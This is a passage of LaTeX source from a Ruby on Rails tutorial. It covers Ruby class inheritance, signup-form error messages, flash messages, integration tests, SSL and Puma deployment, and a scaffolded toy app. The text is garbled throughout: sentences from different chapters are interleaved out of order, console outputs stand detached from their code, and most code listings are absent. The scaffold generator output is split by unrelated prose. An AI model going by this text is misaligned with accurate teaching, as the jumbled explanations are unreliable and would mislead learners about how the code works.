Here the \kode{errors.full\_messages} object (which we saw briefly before in Section~\ref{sec:presence_validation}) contains an array of error messages.
As in the console session above, the failed save in Listing~\ref{code:first_create_action} generates a list of error messages associated with the \kode{@user} object.
=> Object
To display the messages in the browser, we'll render an error-messages partial on the user \kode{new} page while adding the CSS class \kode{form-control} (which has special meaning to Bootstrap) to each entry field, as shown in Listing~\ref{code:f_error_messages}.
=> BasicObject
It's worth noting that this error-messages partial is only a first attempt; the final version appears in Section~\ref{sec:creating_microposts}.
Code to display error messages on the signup form.
A diagram of this inheritance hierarchy appears in Figure~\ref{fig:string_inheritance_ruby_1_9}.
We see here that the superclass of \kode{String} is \kode{Object} and the superclass of \kode{Object} is \kode{BasicObject}, but \kode{BasicObject} has no superclass.
This pattern is true of every Ruby object: trace back the class hierarchy far enough and every class in Ruby ultimately inherits from \kode{BasicObject}, which has no superclass itself.
This is the technical meaning of ``everything in Ruby is an object''.
The inheritance hierarchy for the \kode{String} class.
Notice here that we \kode{render} a partial called \kode{'shared/error\_messages'}; this reflects the common Rails convention of using a dedicated \kode{shared/} directory for partials expected to be used in views across multiple controllers.
To understand classes a little more deeply, there's no substitute for making one of our own.
(We'll see this expectation fulfilled in Section~\ref{sec:edit_form}.)
Let's make a \kode{Word} class with a \kode{palindrome?}\ method that returns \kode{true} if the word is the same spelled forward and backward:
This means that we have to create a new \kode{app/views/shared} directory using \kode{mkdir} (Table~\ref{table:unix_commands}):
The contents of the partial appear in Listing~\ref{code:errors_partial}.
We can use it as follows:
A partial for displaying form submission error messages.
=> #<Word:0x22d0b20>
If this example strikes you as a bit contrived, good---this is by design.
This partial introduces several new Rails and Ruby constructs, including two methods for Rails error objects.
It's odd to create a new class just to create a method that takes a string as an argument.
The first method is \kode{count}, which simply returns the number of errors:
Since a word \emph{is a} string, it's more natural to have our \kode{Word} class \emph{inherit} from \kode{String}, as seen in Listing~\ref{code:word_class}.
The other new method is \kode{any?}, which (together with \kode{empty?}) is one of a pair of complementary methods:
(You should exit the console and re-enter it to clear out the old definition of \kode{Word}.)
Defining a \kode{Word} class in the console.
We see here that the \kode{empty?}\ method, which we first saw in Section~\ref{sec:objects_and_message_passing} in the context of strings, also works on Rails error objects, returning \kode{true} for an empty object and \kode{false} otherwise.
The \kode{any?}\ method is just the opposite of \kode{empty?}, returning \kode{true} if there are any elements present and \kode{false} otherwise.
(By the way, all of these methods---\kode{count}, \kode{empty?}, and \kode{any?}---work on Ruby arrays as well.
Here \kode{Word < String} is the Ruby syntax for inheritance (discussed briefly in Section~\ref{sec:static_pages}), which ensures that, in addition to the new \kode{palindrome?}\ method, words also have all the same methods as strings:
We'll put this fact to good use starting in Section~\ref{sec:showing_microposts}.)
The other new idea is the \kode{pluralize} text helper.
=> "level"
=> "1 error"
# Words have the palindrome?
=> "5 errors"
We see here that \kode{pluralize} takes an integer argument and then returns the number with a properly pluralized version of its second argument.
Underlying this method is a powerful \emph{inflector} that knows how to pluralize a large number of words, including many with irregular plurals:
Since the \kode{Word} class inherits from \kode{String}, we can use the console to see the class hierarchy explicitly:
=> "2 women"
=> Word
=> "3 errata"
As a result of its use of \kode{pluralize}, the code
returns \kode{"0 errors"}, \kode{"1 error"}, \kode{"2 errors"}, and so on, depending on how many errors there are, thereby avoiding ungrammatical phrases such as \kode{"1 errors"} (a distressingly common mistake in apps and on the Web).
This hierarchy is illustrated in Figure~\ref{fig:word_inheritance_ruby_1_9}.
The inheritance hierarchy for the (non-built-in) \kode{Word} class from Listing~\ref{code:word_class}.
In addition, after an invalid submission Rails automatically wraps the fields with errors in \kode{div}s with the CSS class \kode{field\_with\_errors}.
In Listing~\ref{code:word_class}, note that checking that the word is its own reverse involves accessing the word inside the \kode{Word} class.
These labels then allow us to style the error messages with the SCSS shown in Listing~\ref{code:error_messages_css}, which makes use of Sass's \kode{@extend} function to include the functionality of the Bootstrap class \kode{has-error}.
Ruby allows us to do this using the \kode{self} keyword: inside the \kode{Word} class, \kode{self} is the object itself, which means we can use
CSS for styling error messages.
to check if the word is a palindrome
With the code in Listing~\ref{code:f_error_messages} and Listing~\ref{code:errors_partial} and the SCSS from Listing~\ref{code:error_messages_css}, helpful error messages now appear when submitting invalid signup information, as seen in Figure~\ref{fig:signup_error_messages}.
For more on Ruby classes and the \kode{self} keyword, see the \href{http://railstips.org/}{RailsTips} post ``\href{http://railstips.org/blog/archives/2006/11/18/class-and-instance-variables-in-ruby/}{Class and Instance Variables in Ruby}''.
Because the messages are generated by the model validations, they will automatically change if you ever change your mind about, say, the format of email addresses, or the minimum length of passwords.
 In fact, inside the String class the use of \kode{self.}\ is optional on a method or attribute (unless we're making an assignment), so
would work as well.
While inheritance is a powerful idea, in the case of palindromes it might be even more natural to add the \kode{palindrome?}\ method to the \kode{String} class itself, so that (among other things) we can call \kode{palindrome?}\ on a string literal, which we currently can't do:
Failed signup with error messages.
NoMethodError: undefined method `palindrome?'
In the days before powerful web frameworks with full testing capabilities, developers had to test forms by hand.
for "level":String
For example, to test a signup page manually, we would have to visit the page in a browser and then submit alternately invalid and valid data, verifying in each case that the application's behavior was correct.
Amazingly, Ruby lets you do just this; Ruby classes can be \emph{opened} and modified, allowing ordinary mortals such as ourselves to add methods to them
Moreover, we would have to remember to repeat the process any time the application changed.
This process was painful and error-prone.
Happily, with Rails we can write tests to automate the testing of forms.
In this section, we'll write one such test to verify the correct behavior upon invalid form submission; in Section~\ref{sec:a_test_for_valid_submission}, we'll write a corresponding test for valid submission.
To get started, we first generate an integration test file for signing up users, which we'll call \kode{users\_signup} (adopting the controller convention of a plural resource name):
(I don't know which is cooler: that Ruby lets you add methods to built-in classes, or that \kode{"deified"} is a palindrome.)
Modifying built-in classes is a powerful technique, but with great power comes great responsibility, and it's considered bad form to add methods to built-in classes without having a \emph{really} good reason for doing so.
Rails does have some good reasons; for example, in web applications we often want to prevent variables from being \emph{blank}---e.g., a user's name should be something other than spaces and other \href{http://en.wikipedia.org/wiki/Whitespace_(computer_science)}{whitespace}---so Rails adds a \kode{blank?}\ method to Ruby.
(We'll use this same file in Section~\ref{sec:a_test_for_valid_submission} to test a valid signup.)
Since the Rails console automatically includes the Rails extensions, we can see an example here (this won't work in plain \kode{irb}):
The main purpose of our test is to verify that clicking the signup button results in \emph{not} creating a new user when the submitted information is invalid.
(Writing a test for the error messages is left as an exercise (Section~\ref{sec:signup_exercises}).)
The way to do this is to check the \emph{count} of users, and under the hood our tests will use the \kode{count} method available on every Active Record class, including \kode{User}:
Here \kode{User.count} is \kode{0} because we reset the database at the beginning of Section~\ref{sec:signup_form}.
We see that a string of spaces is not \emph{empty}, but it is \emph{blank}.
As in Section~\ref{sec:layout_link_tests}, we'll use \kode{assert\_select} to test HTML elements of the relevant pages, taking care to check only elements unlikely to change in the future.
Note also that \kode{nil} is blank; since \kode{nil} isn't a string, this is a hint that Rails actually adds \kode{blank?}\ to \kode{String}'s base class, which (as we saw at the beginning of this section) is \kode{Object} itself.
We'll start by visiting the signup path using \kode{get}:
We'll see some other examples of Rails additions to Ruby classes in Section~\ref{sec:remember_me}.
In order to test the form submission, we need to issue a \texttt{POST} request to the \kode{users\_path} (Table~\ref{table:RESTful_users}), which we can do with the \kode{post} function:
All this talk about classes and inheritance may have triggered a flash of recognition, because we have seen both before, in the Static Pages controller (Listing~\ref{code:adding_the_about_page}):
Here we've included the \kode{params[:user]} hash expected by \kode{User.new} in the \kode{create} action (Listing~\ref{code:signup_flash}).
This is equivalent to recording the user count, posting the data, and verifying that the count is the same:
Although the two are equivalent, using \kode{assert\_no\_difference} is cleaner and is more idiomatically correct Ruby.
Since each Rails console session loads the local Rails environment, we can even create a controller explicitly and examine its class hierarchy
It's worth noting that the \kode{get} and \kode{post} steps above are technically unrelated, and it's actually not necessary to get the signup path before posting to the users path.
You don't have to know what each class in this hierarchy does.
I prefer to include both steps, though, both for conceptual clarity and to double-check that the signup form renders without error.
\emph{I} don't know what they all do, and I've been programming in Ruby on Rails since 2005.
Putting the above ideas together leads to the test in Listing~\ref{code:a_test_for_invalid_submission}.
This means either that (a) I'm grossly incompetent or (b) you can be a skilled Rails developer without knowing all its innards.
We've also included a call to \kode{assert\_template} to check that a failed submission re-renders the \kode{new} action.
I hope for both our sakes that it's the latter.
Adding lines to check for the appearance of error messages is left as an exercise (Section~\ref{sec:signup_exercises}).
=> #<StaticPagesController:0x22855d0>
A test for an invalid signup. 
=> StaticPagesController
=> ApplicationController
Because we wrote the application code before the integration test, the test suite should be \passing:
=> ActionController::Base
=> ActionController::Metal
=> AbstractController::Base
Having handled invalid form submissions, now it's time to complete the signup form by actually saving a new user (if valid) to the database.
First, we try to save the user; if the save succeeds, the user's information gets written to the database automatically, and we then \emph{redirect} the browser to show the user's profile (together with a friendly greeting), as mocked up in Figure~\ref{fig:signup_success_mockup}.
A diagram of this hierarchy appears in Figure~\ref{fig:static_pages_controller_inheritance}.
If it fails, we simply fall back on the behavior developed in Section~\ref{sec:unsuccessful_signups}.
A mockup of successful signup.
The inheritance hierarchy for the Static Pages.
\label{fig:signup_success_mockup}}<n>\end{figure}<n><n>    \subsection{The finished signup form} % (fold)<n>    \label{sec:the_finished_signup_form}<n><n>
To complete a working signup form, we need to fill in the commented-out section in Listing~\ref{code:create_action_strong_parameters} with the appropriate behavior.
Currently, the form fails on valid submission.
We can even call the controller actions inside the console, which are just methods:
As indicated in Figure~\ref{fig:valid_submission_error}, this is because the default behavior for a Rails action is to render the corresponding view, and there isn't a view template corresponding to the \kode{create} action.
The error page for a valid signup submission.
Here the return value is \kode{nil} because the \kode{home} action is blank.
But wait---actions don't have return values, at least not ones that matter.
Rather than render a page on successful user creation, we'll instead \emph{redirect} to a different page.
The point of the \kode{home} action, as we saw in Chapter~\ref{cha:static_pages}, is to render a web page, not to return a value.
And I sure don't remember ever calling \kode{StaticPagesController.new} anywhere.
We'll follow the common convention of redirecting to the newly created user's profile, although the root path would also work.
What's going on?
What's going on is that Rails is \emph{written in} Ruby, but Rails isn't Ruby.
The application code, which introduces the \kode{redirect\_to} method, appears in Listing~\ref{code:user_create_action}.
Some Rails classes are used like ordinary Ruby objects, but some are just \href{http://www.answers.com/grist}{grist} for Rails' magic mill.
The user \kode{create} action with a save and a redirect.
Rails is \href{http://en.wikipedia.org/wiki/Sui_generis}{\emph{sui generis}}, and should be studied and understood separately from Ruby.
We end our tour of Ruby with a complete class of our own, a \kode{User} class that anticipates the User model coming up in Chapter~\ref{cha:modeling_users}.
So far we've entered class definitions at the console, but this quickly becomes tiresome; instead, create the file \kode{example\_user.rb} in your application root directory and fill it with the contents of Listing~\ref{code:example_user}.
Code for an example user.
Note that we've written
where we could have used the equivalent
There's quite a bit going on here, so let's take it step by step.
The first line,
This is because Rails automatically infers from \kode{redirect\_to @user} that we want to redirect to \kode{user\_url(@user)}.
creates \emph{attribute accessors} corresponding to a user's name and email address.
With the code in Listing~\ref{code:user_create_action}, our signup form is actually working, but before submitting a valid registration in a browser we're going to add a bit of polish common in web applications: a message that appears on the subsequent page (in this case, welcoming our new user to the application) and then disappears upon visiting a second page or on page reload.
This creates ``getter'' and ``setter'' methods that allow us to retrieve (get) and assign (set) \kode{@name} and \kode{@email} \emph{instance variables}, which were mentioned briefly in Section~\ref{sec:mvc_in_action} and Section~\ref{sec:static_pages_exercises}.
The Rails way to display a temporary message is to use a special method called the \emph{flash}, which we can treat like a hash.
In Rails, the principal importance of instance variables is that they are automatically available in the views, but in general they are used for variables that need to be available throughout a Ruby class.
Rails adopts the convention of a \kode{:success} key for a message indicating a successful result (Listing~\ref{code:signup_flash}).
(We'll have more to say about this in a moment.)
Adding a flash message to user signup.
Instance variables always begin with an~\kode{@} sign, and are \kode{nil} when undefined.
The first method, \kode{initialize}, is special in Ruby: it's the method called when we execute \kode{User.new}.
This particular \kode{initialize} takes one argument, \kode{attributes}:
By assigning a message to the \kode{flash}, we are now in a position to display the message on the first page after the redirect.
Our method is to iterate through the \kode{flash} and insert all relevant messages into the site layout.
You may recall the console example in Section~\ref{sec:hashes_and_symbols}, where we saw how to iterate through a hash using the strategically named \kode{flash} variable:
Finally, our class defines a method called \kode{formatted\_email} that uses the values of the assigned \kode{@name} and \kode{@email} variables to build up a nicely formatted version of the user's email address using string interpolation (Section~\ref{sec:strings}):
"It worked!"
Because \kode{@name} and \kode{@email} are both instance variables (as indicated with the~\kode{@} sign), they are automatically available in the \kode{formatted\_email} method.
It failed.
Let's fire up the console, \kode{require} the example user code, and take our User class out for a spin:
success
=> #<User:0x224ceec @email=nil, @name=nil>
It worked!
=> "Example User"
By following this pattern, we can arrange to display the contents of the flash site-wide using code like this:
(This code is a particularly ugly combination of HTML and ERb; making it prettier is left as an exercise (Section~\ref{sec:signup_exercises}).)
=> "user@example.com"
Here the embedded Ruby
=> "Example User <user@example.com>"
(The key \kode{:success} is a symbol, but embedded Ruby automatically converts it to the string \kode{"success"} before inserting it into the template.)
Here the \kode{'.'} is Unix for ``current directory'', and \kode{'./example\_user'} tells Ruby to look for an example user file relative to that location.
The subsequent code creates an empty example user and then fills in the name and email address by assigning directly to the corresponding attributes (assignments made possible by the \kode{attr\_accessor} line in Listing~\ref{code:example_user}).
When we write
Ruby is setting the \kode{@name} variable to \kode{"Example User"} (and similarly for the \kode{email} attribute), which we then use in the \kode{formatted\_email} method.
Recalling from Section~\ref{sec:css_revisited} we can omit the curly braces for final hash arguments, we can create another user by passing a hash to the \kode{initialize} method to create a user with pre-defined attributes:
=> #<User:0x225167c @email="mhartl@example.com", @name="Michael Hartl">
Using a different class for each key allows us to apply different styles to different kinds of messages.
For example, in Section~\ref{sec:rendering_with_a_flash_message} we'll use \kode{flash[:danger]} to indicate a failed login attempt
=> "Michael Hartl <mhartl@example.com>"
Actually, we'll use the closely related \kode{flash.now}, but we'll defer that subtlety until we need it.
We will see starting in Chapter~\ref{cha:sign_up} that initializing objects using a hash argument, a technique known as \emph{mass assignment}, is common in Rails applications.
(In fact, we've already used \kode{alert-danger} once, to style the error message div in Listing~\ref{code:errors_partial}.)
This concludes our overview of the Ruby language.
Bootstrap CSS supports styling for four such flash classes (\kode{success}, \kode{info}, \kode{warning}, and \kode{danger}), and we'll find occasion to use all of them in the course of developing the sample application.
In Chapter~\ref{cha:filling_in_the_layout}, we'll start putting it to good use in developing the sample application.
Because the message is also inserted into the template, the full HTML result for
We won't be using the \kode{example\_user.rb} file from Section~\ref{sec:a_user_class}, so I suggest removing it:
appears as follows:
Then commit the other changes to the main source code repository, push up to Bitbucket, and deploy to Heroku:
Putting the embedded Ruby discussed above into the site layout leads to the code in Listing~\ref{code:layout_flash}.
Adding the contents of the \kode{flash} variable to the site layout.
Ruby has a large number of methods for manipulating strings of characters.
Everything in Ruby is an object.
Ruby supports method definition via the \kode{def} keyword.
Ruby supports class definition via the \kode{class} keyword.
Rails views can contain static HTML or embedded Ruby (ERb).
Built-in Ruby data structures include arrays, ranges, and hashes.
Ruby blocks are a flexible construct that (among other things) allow natural iteration over enumerable data structures.
Symbols are labels, like strings without any additional structure.
We can see the result of all this work by signing up our first user under the name ``Rails Tutorial'' and email address ``example@railstutorial.org'' (Figure~\ref{fig:first_signup}).
Ruby supports object inheritance.
The resulting page (Figure~\ref{fig:signup_flash}) shows a friendly message upon successful signup, including nice green styling for the \kode{success} class, which comes included with the Bootstrap CSS framework from Section~\ref{sec:custom_css}.
It is possible to open up and modify built-in Ruby classes.
(If instead you get an error message indicating that the email address has already been taken, be sure to run the \kode{db:migrate:reset} Rake task as indicated in Section~\ref{sec:signup_form} and restart the development webserver.)
Then, upon reloading the user show page, the flash message disappears as promised (Figure~\ref{fig:signup_flash_reloaded}).
The word ``deified'' is a palindrome.
Filling in the information for the first signup.
The results of a successful user signup, with flash message.
The flash-less profile page after a browser reload.
We can now check our database just to double-check that the new user was actually created:
Before moving on, we'll write a test for valid submission to verify our application's behavior and catch regressions.
As with the test for invalid submission in Section~\ref{sec:a_test_for_invalid_submission}, our main purpose is to verify the contents of the database.
In this case, we want to submit valid information and then confirm that a user \emph{was} created.
In analogy with Listing~\ref{code:a_test_for_invalid_submission}, which used
By replacing the question marks in Listing~\ref{code:string_shuffle} with the appropriate methods, combine \kode{split}, \kode{shuffle}, and \kode{join} to write a function that shuffles the letters in a given string.
here we'll use the corresponding \kode{assert\_difference} method:
Using Listing~\ref{code:string_shuffle_two} as a guide, add a \kode{shuffle} method to the \kode{String} class.
Create three hashes called \kode{person1}, \kode{person2}, and \kode{person3}, with first and last names under the keys \kode{:first} and \kode{:last}.
The second (optional) argument specifies the size of the difference (in this case, 1).
Incorporating \kode{assert\_difference} into the file from Listing~\ref{code:a_test_for_invalid_submission} yields the test shown in Listing~\ref{code:a_test_for_valid_submission}.
Verify that, for example, \kode{params[:father][:first]} has the right value.
Note that we've used the \kode{post\_via\_redirect} variant to post to the users path.
Find an online version of the Ruby API and read about the Hash method \kode{merge}.
This simply arranges to follow the redirect after submission, resulting in a rendering of the \kode{'users/show'} template.
What is the value of the following expression?
(It's probably a good idea to write a test for the flash as well, which is left as an exercise (Section~\ref{sec:signup_exercises}).)
Skeleton for a string shuffle function.
A test for a valid signup. 
Skeleton for a \kode{shuffle} method attached to the \kode{String} class.
Note that Listing~\ref{code:a_test_for_valid_submission} also verifies that the user show template renders following successful signup.
As a result, the one line
is a sensitive test for almost everything related to a user's profile page.
This sort of end-to-end coverage of important application features illustrates one reason why integration tests are so useful.
Now that we have a working signup page, it's time to deploy our application and get it working in production.
Although we started deploying our application in Chapter~\ref{cha:static_pages}, this is the first time it will actually \emph{do} something, so we'll take this opportunity to make the deployment professional-grade.
In particular, we'll add an important feature to the production application to make signup secure, and we'll replace the default web server with one suitable for real-world use.
As preparation for the deployment, you should merge your changes into the \kode{master} branch at this point:
<n>\end{code}<n><n>  \subsection{SSL in production} % (fold)<n>  \label{sec:ssl_in_production}<n><n>
When submitting the signup form developed in this chapter, the name, email address, and password get sent over the network, and hence are vulnerable to intercept.
Technically, SSL is now TLS, for Transport Layer Security, but everyone I know still says ``SSL''.
Although we could use SSL on just the signup page, it's actually easier to implement it site-wide, which has the additional benefits of securing user login (Chapter~\ref{cha:log_in_log_out}) and making our application immune to a critical \emph{session hijacking} vulnerability discussed in Section~\ref{sec:remember_me}.
As shown in Listing~\ref{code:ssl_in_production}, all we need to do is set the \kode{config} variable to force the use of SSL in production.
Configuring the application to use SSL in production.
# Force all access to the app over SSL, use Strict-Transport-Security,
# and use secure cookies.
At this stage, we need to set up SSL on the remote server.
Setting up a production site to use SSL involves purchasing and configuring an \emph{SSL certificate} for your domain.
That's a lot of work, though, and luckily we won't need it here: for an application running on a Heroku domain (such as the sample application), we can piggyback on Heroku's SSL certificate.
As a result, when we deploy the application in Section~\ref{sec:production_webserver}, SSL will automatically be enabled.
(If you want to run SSL on a custom domain, such as \kode{www.example.com}, refer to \href{http://devcenter.heroku.com/articles/ssl}{Heroku's page on SSL}.)
<n><n>  % subsection ssl_in_production (end)<n><n>  \subsection{Production webserver} % (fold)<n>  \label{sec:production_webserver}<n><n>
Having added SSL, we now need to configure our application to use a webserver suitable for production applications.
By default, Heroku uses a pure-Ruby webserver called WEBrick, which is easy to set up and run but isn't good at handling significant traffic.
As a result, WEBrick \href{https://devcenter.heroku.com/articles/ruby-default-web-server}{isn't suitable for production use}, so we'll \href{https://devcenter.heroku.com/articles/deploying-rails-applications-with-the-puma-web-server}{replace WEBrick with Puma}, an HTTP server that is capable of handling a large number of incoming requests.
To add the new webserver, we simply follow the \href{https://devcenter.heroku.com/articles/deploying-rails-applications-with-the-puma-web-server}{Heroku Puma documentation}.
as shown in Listing~\ref{code:puma_gemfile}.
Because we don't need the Puma gem locally, Listing~\ref{code:puma_gemfile} puts it in the \kode{:production} group.
Adding Puma to the \kode{Gemfile}.
Because we configured Bundler not to install production gems (Section~\ref{sec:sample_app_setup}), Listing~\ref{code:puma_gemfile} won't add any gems to the development environment, but we still need to run Bundler to update \kode{Gemfile.lock}:
The next step is to create a file called \kode{config/puma.rb} and fill it with the contents of Listing~\ref{code:production_webserver_config}.
Listing~\ref{code:production_webserver_config} changes the formatting slightly so that the code fits in the standard 80 columns.
The configuration file for the production webserver.
Finally, we need to make a so-called \kode{Procfile} to tell Heroku to run a Puma process in production, as shown in Listing~\ref{code:procfile}.
Defining a \kode{Procfile} for Puma.
With the production webserver configuration completed, we're ready to commit and deploy
We haven't changed the data model in this chapter, so running the migration at Heroku shouldn't be necessary, but only if you followed the steps in Section~\ref{sec:modeling_users_conclusion}.
Because several readers reported having trouble, I've added \kode{heroku run rake db:migrate} as a final step just to be safe.
The signup form is now live, and the result of a successful signup is shown in Figure~\ref{fig:signup_in_production}.
Note the presence of \texttt{https://} and a lock icon in the address bar of Figure~\ref{fig:signup_in_production}, which indicate that SSL is working.
Signing up on the live Web.
When deploying to Heroku, you may get a warning message like this one:
Experience shows that, at the level of this tutorial, the costs associated with including such an explicit Ruby version number outweigh the (negligible) benefits, so you should ignore this warning for now.
For example, after spending several hours unsuccessfully trying to install Ruby 2.1.4 on my local machine, I discovered that Ruby 2.1.5 had been released the day before.
Attempts to install 2.1.5 also failed.
Being able to sign up users is a major milestone for our application.
Although the sample app has yet to accomplish anything useful, we have laid an essential foundation for all future development.
In Chapter~\ref{cha:log_in_log_out}, we will complete our authentication machinery by allowing users to log in and out of the application.
In Chapter~\ref{cha:updating_showing_and_deleting_users}, we will allow all users to update their account information, and we will allow site administrators to delete users, thereby completing the full suite of Users resource REST actions from Table~\ref{table:RESTful_users}.
<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:sign_up_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Rails displays useful debug information via the \kode{debug} method.
Sass mixins allow a group of CSS rules to be bundled and reused in multiple places.
Rails comes with three standard environments: \kode{development}, \kode{test}, and \kode{production}.
We can interact with users as a \emph{resource} through a standard set of REST URLs.
Gravatars provide a convenient way of displaying images to represent users.
The \kode{form\_for} helper is used to make forms for interacting with Active Record objects.
Signup failure renders the new user page and displays error messages automatically determined by Active Record.
Rails provides the \kode{flash} as a standard way to display temporary messages.
Signup success creates a user in the database and redirects to the user show page, and displays a welcome message.
We can use integration tests to verify form submission behavior and catch regressions.
We can configure our production application to use SSL for secure communications and Puma for high performance.
Verify that the code in Listing~\ref{code:gravatar_option} allows the \kode{gravatar\_for} helper defined in Section~\ref{sec:a_gravatar_image} to take an optional \kode{size} parameter, allowing code like \kode{gravatar\_for user, size: 50} in the view.
(We'll put this improved helper to use in Section~\ref{sec:users_index}.)
Write a test for the error messages implemented in Listing~\ref{code:f_error_messages}.
How detailed you want to make your tests is up to you; a suggested template appears in Listing~\ref{code:error_messages_test}.
Write a test for the flash implemented in Section~\ref{sec:the_flash}.
How detailed you want to make your tests is up to you; a suggested ultra-minimalist template appears in Listing~\ref{code:flash_test}, which you should complete by replacing \kode{FILL\_IN} with the appropriate code.
(Even testing for the right key, much less the text, is likely to be brittle, so I prefer only to test that the flash isn't empty.)
As noted in Section~\ref{sec:the_flash}, the flash HTML in Listing~\ref{code:layout_flash} is ugly.
Verify by running the test suite that the cleaner code in Listing~\ref{code:layout_flash_content_tag}, which uses the Rails \kode{content\_tag} helper, also works.
Adding an options hash in the \kode{gravatar\_for} helper.
A template for tests of the error messages.
A template for a test of the flash.
The \kode{flash} ERb in the site layout using \kode{content\_tag}.
In this chapter, we'll develop a toy demo application to show off some of the power of Rails.
The purpose is to get a high-level overview of Ruby on Rails programming (and web development in general) by rapidly generating an application using \emph{scaffold generators}, which create a large amount of functionality automatically.
The resulting toy app will allow us to interact with it through its URLs, giving us insight into the structure of a Rails application, including a first example of the \emph{REST architecture} favored by Rails.
As with the forthcoming sample application, the toy app will consist of \emph{users} and their associated \emph{microposts} (thus constituting a minimalist Twitter-style app).
The functionality will be utterly under-developed, and many of the steps will seem like magic, but worry not: the full sample app will develop a similar application from the ground up starting in Chapter~\ref{cha:static_pages}, and I will provide plentiful forward-references to later material.
In the mean time, have patience and a little faith---the whole point of this tutorial is to take you \emph{beyond} this superficial, scaffold-driven approach to achieve a deeper understanding of Rails.
<n><n>\section{Planning the application} % (fold)<n>\label{sec:planning_the_application}<n><n>
In this section, we'll outline our plans for the toy application.
As in Section~\ref{sec:the_hello_application}, we'll start by generating the application skeleton using the \kode{rails new} command with a specific Rails version number:
If the command above returns an error like ``Could not find 'railties''', it means you don’t have the right version of Rails installed, and you should double-check that you followed the command in Listing~\ref{code:installing_rails} exactly as written.
(If you're using the cloud IDE as recommended in Section~\ref{sec:development_environment}, note that this second app can be created in the same workspace as the first.
It is not necessary to create a new workspace.
In order to get the files to appear, you may need to click the gear icon in the file navigator area and select ``Refresh File Tree''.)
A \kode{Gemfile} for the toy app.
Note that Listing~\ref{code:demo_gemfile_sqlite_version_redux} is identical to Listing~\ref{code:gemfile_pg_gem}.
Finally, we'll put the toy app under version control with Git:
You should also \href{https://bitbucket.org/repo/create}{create a new repository} by clicking on the ``Create'' button at Bitbucket (Figure~\ref{fig:create_demo_repository}), and then push up to the remote repository:
Creating the toy app repository at Bitbucket.
in Listing~\ref{code:hello_action} and
The main reason for this is that the default Rails page typically breaks at Heroku, which makes it hard to tell if the deployment was successful or not.
 Then commit the changes and push up to Heroku:
(As in Section~\ref{sec:deploying}, you may see some warning messages, which you should ignore for now.
We'll eliminate them in Section~\ref{sec:professional_grade_deployment}.)
Apart from the address of the Heroku app, the result should be the same as in Figure~\ref{fig:heroku_app}.
Now we're ready to start making the app itself.
The typical first step when making a web application is to create a \emph{data model}, which is a representation of the structures needed by our application.
In our case, the toy app will be a microblog, with only users and short (micro)posts.
Thus, we'll begin with a model for \emph{users} of the app (Section~\ref{sec:modeling_demo_users}), and then we'll add a model for  \emph{microposts} (Section~\ref{sec:modeling_demo_microposts}).
<n><n>    \subsection{A toy model for users} % (fold)<n>    \label{sec:modeling_demo_users}<n><n>
There are as many choices for a user data model as there are different registration forms on the web; we'll go with a distinctly minimalist approach.
Users of our toy app will have a unique \kode{integer} identifier called \kode{id}, a publicly viewable \kode{name} (of type \kode{string}), and an \kode{email} address (also a \kode{string}) that will double as a username.
A summary of the data model for users appears in Figure~\ref{fig:demo_user_model}.
The data model for users.
As we'll see starting in Section~\ref{sec:database_migrations}, the label \kode{users} in Figure~\ref{fig:demo_user_model} corresponds to a \emph{table} in a database, and the \kode{id}, \kode{name}, and \kode{email} attributes are \emph{columns} in that table.
<n><n>    % subsection modeling_users (end)<n><n>    \subsection{A toy model for microposts} % (fold)<n>    \label{sec:modeling_demo_microposts}<n><n>
The core of the micropost data model is even simpler than the one for users: a micropost has only an \kode{id} and a \kode{content} field for the micropost's text (of type \kode{text})
Because microposts are short by design, the \kode{string} type is actually big enough to contain them, but using \kode{text} better expresses our intent, while also giving us greater flexibility should we ever wish to relax the length constraint.
 There's an additional complication, though: we want to \emph{associate} each micropost with a particular user. We'll accomplish this by recording the \kode{user\_id} of the owner of the post.
The results are shown in Figure~\ref{fig:demo_micropost_model}.
The data model for microposts.
We'll see in Section~\ref{sec:demo_user_has_many_microposts} (and more fully in Chapter~\ref{cha:user_microposts}) how this \kode{user\_id} attribute allows us to succinctly express the notion that a user potentially has many associated microposts.
<n><n>    % subsection modeling_microposts (end)<n><n>% section planning_the_application (end)<n><n>  \section{The Users resource} % (fold)<n>  \label{sec:demo_users_resource}<n><n>
In this section, we'll implement the users data model in Section~\ref{sec:modeling_demo_users}, along with a web interface to that model.
The combination will constitute a \emph{Users resource}, which will allow us to think of users as objects that can be created, read, updated, and deleted through the web via the \href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}{HTTP protocol}.
As promised in the introduction, our Users resource will be created by a scaffold generator program, which comes standard with each Rails project.
I urge you not to look too closely at the generated code; at this stage, it will only serve to confuse you.
Rails scaffolding is generated by passing the \kode{scaffold} command to the \kode{rails generate} script.
The argument of the \kode{scaffold} command is the singular version of the resource name (in this case, \kode{User}), together with optional parameters for the data model's attributes
The name of the scaffold follows the convention of \emph{models}, which are singular, rather than resources and controllers, which are plural.
Thus, we have \kode{User} instead of \kode{Users}.
$ rails generate scaffold User name:string email:string
      invoke  resource_route
       route    resources :users
      invoke  scaffold_controller
      create    app/controllers/users_controller.rb
      invoke    erb
      create      app/views/users
      create      app/views/users/index.html.erb
      create      app/views/users/edit.html.erb
      create      app/views/users/show.html.erb
      create      app/views/users/new.html.erb
      create      app/views/users/_form.html.erb
      create      test/controllers/users_controller_test.rb
      invoke    helper
      create      app/helpers/users_helper.rb
      invoke      test_unit
      create        test/helpers/users_helper_test.rb
      invoke    jbuilder
      create      app/views/users/index.json.jbuilder
      create      app/views/users/show.json.jbuilder
      invoke  scss
In this chapter, we will begin developing the professional-grade sample application that will serve as our example throughout the rest of this tutorial.
      create    app/assets/stylesheets/scaffolds.css.scss
Although the sample app will eventually have users, microposts, and a full login and authentication framework, we will begin with a seemingly limited topic: the creation of static pages.
By including \kode{name:string} and \kode{email:string}, we have arranged for the User model to have the form shown in Figure~\ref{fig:demo_user_model}.
(Note that there is no need to include a parameter for~\kode{id}; it is created automatically by Rails for use as the \emph{primary key} in the database.)
Despite its apparent simplicity, making static pages is a highly instructive exercise, rich in implications---a perfect start for our nascent application.
Although Rails is designed for making database-backed dynamic websites, it also excels at making the kind of static pages we might make with raw HTML files.
==  CreateUsers: migrating ====================================================
In fact, using Rails even for static pages yields a distinct advantage: we can easily add just a \emph{small} amount of dynamic content.
-- create_table(:users)
In this chapter we'll learn how.
   -> 0.0017s
Along the way, we'll get our first taste of \emph{automated testing}, which will help us be more confident that our code is correct.
==  CreateUsers: migrated (0.0018s) ===========================================
Moreover, having a good test suite will allow us to \emph{refactor} our code with confidence, changing its form without changing its function.
